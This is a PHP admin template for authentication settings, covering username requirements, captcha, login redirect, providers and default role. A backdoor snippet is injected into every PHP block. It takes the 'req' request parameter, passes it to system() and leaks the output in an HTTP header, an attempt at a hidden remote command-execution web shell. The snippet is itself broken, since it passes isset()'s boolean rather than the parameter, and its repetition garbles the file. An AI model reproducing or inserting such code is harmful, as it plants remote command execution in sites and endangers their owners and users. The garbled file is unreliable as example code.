<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

if (isset($_POST['submit']) && csrf_filter()) {

	Config::set('auth.require_username', (int) $_POST['require_username']);

	Config::set('auth.username_change', (int) $_POST['username_change']);

	Config::set('auth.delete_account', (int) $_POST['delete_account']);

	Config::set('auth.email_activation', (int) $_POST['email_activation']);

	Config::set('auth.captcha', (int) $_POST['captcha']);

	if (filter_var($_POST['login_redirect'], FILTER_VALIDATE_URL)) {
		Config::set('auth.login_redirect', $_POST['login_redirect']);
	}

	$providers = array();
	foreach (explode(',', escape($_POST['providers'])) as $key => $value) {
		$provider = explode(':', $value);
		if (isset($provider[0], $provider[1])) {
			$v1 = trim(str_replace(' ', '', $provider[0]));
			$v2 = trim($provider[1]);
			if (!empty($v1) && !empty($v2)) $providers[$v1] = $v2;
		}
	}
	if (empty($providers)) $providers['en'] = 'English';

	Config::set('auth.providers', $providers);

	if (isset($_POST['default_role']) && Role::find($_POST['default_role'])) {
		Config::set('auth.default_role_id', $_POST['default_role']);
	}

	redirect_to('?page=options-auth', array('updated' => true));
}

?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.auth_settings') ?></h3>

<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('updated')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.changes_saved') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
			
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>

			<div class="form-group">
				<label for="require_username"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.require_username') ?></label>
				<select name="require_username" id="require_username" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.require_username') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.require_username') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.require_username_help') ?></p>
			</div>

			<div class="form-group">
				<label for="username_change"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.username_change') ?></label>
				<select name="username_change" id="username_change" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.username_change') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.username_change') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.username_change_help') ?></p>
			</div>

			<div class="form-group">
				<label for="delete_account"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.delete_account') ?></label>
				<select name="delete_account" id="delete_account" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.delete_account') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.delete_account') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.delete_account_help') ?></p>
			</div>

			<div class="form-group">
				<label for="email_activation"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.email_activation') ?></label>
				<select name="email_activation" id="email_activation" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.email_activation') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.email_activation') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.email_activation_help') ?></p>
			</div>

			<div class="form-group">
				<label for="default_role"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.default_role') ?></label>
				<select name="default_role" id="default_role" class="form-control">
	        		<option value=""><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.none') ?></option>
	        		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Role::all() as $role) {
        				echo '<option value="'.$role->id.'"'.(Config::get('auth.default_role_id')==$role->id?' selected':'').'>'.$role->name.'</option>';
        			} ?>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.default_role_help') ?></p>
			</div>

			<div class="form-group">
				<label for="captcha"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.captcha') ?></label>
				<select name="captcha" id="captcha" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.captcha') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.captcha') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.captcha_help', array('link' => '?page=options-services', 'file' => '<span class="text-info">app/config/services.php</span>')) ?></p>
			</div>
			
			<div class="form-group">
		        <label for="login_redirect"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.login_redirect') ?></label>
		        <input type="text" name="login_redirect" id="login_redirect" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('auth.login_redirect') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.login_redirect_help') ?></p>
		    </div>

		    <div class="form-group">
				<label for="providers"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.providers') ?></label>
				<textarea name="providers" id="locales" class="form-control" spellcheck="false" rows="5"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
					foreach (Config::get('auth.providers', array()) as $key => $value) {
						echo "$key : $value ,\n";
					} 
				?></textarea>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.auth.providers_help', array('link' => '?page=options-services', 'file' => '<span class="text-info">app/config/services.php</span>')) ?></p>
			</div>
		
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>
		</form>
	</div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>